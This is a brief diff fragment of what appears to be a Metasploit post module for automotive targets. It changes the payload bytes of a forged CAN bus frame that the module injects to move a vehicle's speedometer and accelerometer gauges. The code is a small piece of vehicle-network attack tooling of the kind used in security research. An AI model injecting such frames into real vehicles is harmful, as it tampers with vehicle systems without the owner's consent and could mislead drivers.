@@ -25,6 +25,6 @@ class MetasploitModule < Msf::Post
       return
     end
     print_status("Moving the accelorometer and speedometer...")
-    client.automotive.cansend(datastore['CANBUS'], "202", "6010606060606000")
+    client.automotive.cansend(datastore['CANBUS'], "202", "6001606060606000")
   end
 end
